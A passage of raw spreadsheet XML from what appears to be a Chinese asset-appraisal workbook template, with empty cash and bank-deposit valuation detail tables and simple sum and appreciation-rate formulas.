      <c r="B17" s="380" t="n"/>
      <c r="C17" s="307" t="n"/>
      <c r="D17" s="327" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="564" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="347" t="n"/>
      <c r="L17" s="399" t="n"/>
    </row>
    <row r="18" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="307" t="n"/>
      <c r="D18" s="327" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="564" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="347" t="n"/>
      <c r="L18" s="399" t="n"/>
    </row>
    <row r="19" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="307" t="n"/>
      <c r="D19" s="327" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="564" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="347" t="n"/>
      <c r="L19" s="399" t="n"/>
    </row>
    <row r="20" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="307" t="n"/>
      <c r="D20" s="327" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="564" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="347" t="n"/>
      <c r="L20" s="399" t="n"/>
    </row>
    <row r="21" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="307" t="n"/>
      <c r="D21" s="327" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="564" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="347" t="n"/>
      <c r="L21" s="399" t="n"/>
    </row>
    <row r="22" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="307" t="n"/>
      <c r="D22" s="327" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="564" t="n"/>
      <c r="J22" s="347" t="n"/>
      <c r="K22" s="347" t="n"/>
      <c r="L22" s="399" t="n"/>
    </row>
    <row r="23" ht="19.5" customFormat="1" customHeight="1" s="389">
      <c r="A23" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B23" s="201" t="n"/>
      <c r="C23" s="201" t="inlineStr">
        <is>
          <t>货币汇总</t>
        </is>
      </c>
      <c r="D23" s="379" t="inlineStr">
        <is>
          <t>合     计</t>
        </is>
      </c>
      <c r="E23" s="555">
        <f>SUM(E6:E22)</f>
        <v/>
      </c>
      <c r="F23" s="555">
        <f>SUM(F6:F22)</f>
        <v/>
      </c>
      <c r="G23" s="555">
        <f>F23-E23</f>
        <v/>
      </c>
      <c r="H23" s="555">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
      <c r="I23" s="564" t="n"/>
      <c r="J23" s="347" t="n"/>
      <c r="K23" s="347" t="n"/>
      <c r="L23" s="399" t="n"/>
    </row>
    <row r="24" ht="15.75" customHeight="1" s="415">
      <c r="B24" s="346" t="n"/>
      <c r="C24" s="346" t="n"/>
      <c r="D24" s="347" t="n"/>
      <c r="E24" s="347" t="n"/>
      <c r="F24" s="184" t="n"/>
      <c r="G24" s="550" t="n"/>
      <c r="H24" s="550" t="n"/>
      <c r="I24" s="550" t="n"/>
      <c r="J24" s="347" t="n"/>
      <c r="K24" s="347" t="n"/>
      <c r="L24" s="322" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="F24:I24"/>
    <mergeCell ref="B1:I1"/>
    <mergeCell ref="B2:I2"/>
    <mergeCell ref="H3:I3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K27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A27" sqref="A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.33333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col outlineLevel="1" width="13" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="11.8333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="14" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="14" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="13.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="10.8333333333333" customWidth="1" style="410" min="10" max="10"/>
    <col width="11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货币资金—现金评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="17.2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402" t="inlineStr">
        <is>
          <t>表3-1-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="17.2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7" t="n"/>
      <c r="J4" s="377" t="n"/>
      <c r="K4" s="378">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="23.25" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="379" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="379" t="inlineStr">
        <is>
          <t>存放部门（单位)</t>
        </is>
      </c>
      <c r="D5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="E5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="F5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="379" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K5" s="379" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="565" t="n"/>
      <c r="F6" s="566" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="565" t="n"/>
      <c r="F7" s="566" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="565" t="n"/>
      <c r="F8" s="566" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="565" t="n"/>
      <c r="F9" s="566" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="565" t="n"/>
      <c r="F10" s="566" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="384" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="565" t="n"/>
      <c r="F11" s="566" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="384" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="565" t="n"/>
      <c r="F12" s="566" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="565" t="n"/>
      <c r="F13" s="566" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="565" t="n"/>
      <c r="F14" s="566" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="565" t="n"/>
      <c r="F15" s="566" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="565" t="n"/>
      <c r="F16" s="566" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="565" t="n"/>
      <c r="F17" s="566" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="565" t="n"/>
      <c r="F18" s="566" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="565" t="n"/>
      <c r="F19" s="566" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="565" t="n"/>
      <c r="F20" s="566" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="565" t="n"/>
      <c r="F21" s="566" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="565" t="n"/>
      <c r="F22" s="566" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="565" t="n"/>
      <c r="F23" s="566" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="565" t="n"/>
      <c r="F24" s="566" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="565" t="n"/>
      <c r="F25" s="566" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="565" t="n"/>
      <c r="F26" s="566" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" customFormat="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="379" t="inlineStr">
        <is>
          <t>合         计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="383" t="n"/>
      <c r="E27" s="565" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="555">
        <f>ROUND(SUM(G6:G26),2)</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>ROUND(SUM(H6:H26),2)</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="J3:K3"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B2:K2"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:K27">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590277777777778" right="0.590277777777778" top="0.865972222222222" bottom="0.972222222222222" header="0.472222222222222" footer="0.590277777777778"/>
  <pageSetup orientation="landscape" paperSize="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codeName="Sheet12">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L30"/>
  <sheetViews>
    <sheetView showZeros="0" view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="4.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="17.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="13" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="11.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="9" customWidth="1" style="410" min="11" max="11"/>
    <col width="8.16666666666667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货币资金—银行存款评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="L2" s="376" t="n"/>
    </row>
    <row r="3" ht="14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402" t="inlineStr">
        <is>
          <t>表3-1-2</t>
        </is>
      </c>
    </row>
    <row r="4" customForma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7" t="n"/>
      <c r="K4" s="377" t="n"/>
      <c r="L4" s="378">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18.75" customFormat="1" customHeight="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="379" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="379" t="inlineStr">
        <is>
          <t>开户银行</t>
        </is>
      </c>
      <c r="D5" s="379" t="inlineStr">
        <is>
          <t>账号</t>
        </is>
      </c>
      <c r="E5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="F5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="379" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="379" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="379" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="18.75" customFormat="1" customHeight="1" s="369">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="379" t="n"/>
      <c r="C6" s="384" t="n"/>
      <c r="D6" s="365" t="n"/>
      <c r="E6" s="283" t="n"/>
      <c r="F6" s="568" t="n"/>
      <c r="G6" s="566" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-H6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(H6=0,"",J6/H6*100)</f>
        <v/>
      </c>
      <c r="L6" s="379" t="n"/>
    </row>
    <row r="7" ht="18.75" customFormat="1" customHeight="1" s="369">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="379" t="n"/>
      <c r="C7" s="384" t="n"/>
      <c r="D7" s="365" t="n"/>
      <c r="E7" s="379" t="n"/>
      <c r="F7" s="568" t="n"/>
      <c r="G7" s="566" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-H7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(H7=0,"",J7/H7*100)</f>
        <v/>
      </c>
      <c r="L7" s="379" t="n"/>
    </row>
    <row r="8" ht="18.75" customFormat="1" customHeight="1" s="369">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="379" t="n"/>
      <c r="C8" s="367" t="n"/>
      <c r="D8" s="365" t="n"/>
      <c r="E8" s="379" t="n"/>
      <c r="F8" s="568" t="n"/>
      <c r="G8" s="566" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-H8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(H8=0,"",J8/H8*100)</f>
        <v/>
      </c>
      <c r="L8" s="379" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="198" t="n"/>
      <c r="E9" s="198" t="n"/>
      <c r="F9" s="568" t="n"/>
      <c r="G9" s="566" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-H9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(H9=0,"",J9/H9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="198" t="n"/>
      <c r="E10" s="198" t="n"/>
      <c r="F10" s="568" t="n"/>
      <c r="G10" s="566" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-H10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(H10=0,"",J10/H10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="198" t="n"/>
      <c r="E11" s="198" t="n"/>
      <c r="F11" s="568" t="n"/>
      <c r="G11" s="566" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-H11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(H11=0,"",J11/H11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="198" t="n"/>
      <c r="E12" s="198" t="n"/>
      <c r="F12" s="568" t="n"/>
      <c r="G12" s="566" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-H12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(H12=0,"",J12/H12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="198" t="n"/>
      <c r="E13" s="198" t="n"/>
      <c r="F13" s="568" t="n"/>
      <c r="G13" s="566" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-H13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(H13=0,"",J13/H13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="198" t="n"/>
      <c r="E14" s="198" t="n"/>
      <c r="F14" s="568" t="n"/>
      <c r="G14" s="566" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-H14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(H14=0,"",J14/H14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="198" t="n"/>
      <c r="E15" s="198" t="n"/>
      <c r="F15" s="568" t="n"/>
      <c r="G15" s="566" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-H15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(H15=0,"",J15/H15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
